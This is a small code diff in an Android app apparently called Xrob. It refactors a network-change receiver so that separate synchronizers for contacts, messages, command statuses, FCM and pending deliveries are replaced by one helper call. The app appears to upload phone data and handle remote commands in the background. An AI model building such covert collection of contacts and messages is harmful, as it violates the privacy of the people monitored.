@@ -11,6 +11,7 @@ import com.theah64.xrob.asynctasks.FCMSynchronizer;
 import com.theah64.xrob.asynctasks.MessagesSynchronizer;
 import com.theah64.xrob.asynctasks.PendingDeliverySynchronizer;
 import com.theah64.xrob.utils.APIRequestGateway;
+import com.theah64.xrob.utils.Xrob;
 
 public class NetworkChangeReceiver extends BroadcastReceiver {
 
@@ -29,11 +30,7 @@ public class NetworkChangeReceiver extends BroadcastReceiver {
         new APIRequestGateway(context, new APIRequestGateway.APIRequestGatewayCallback() {
             @Override
             public void onReadyToRequest(String apiKey) {
-                new ContactsSynchronizer(context, apiKey).execute();
-                new CommandStatusesSynchronizer(context, apiKey).execute();
-                new FCMSynchronizer(context, apiKey).execute();
-                new MessagesSynchronizer(context, apiKey).execute();
-                new PendingDeliverySynchronizer(context, apiKey).execute();
+                Xrob.doMainTasks(context, apiKey);
             }
 
             @Override
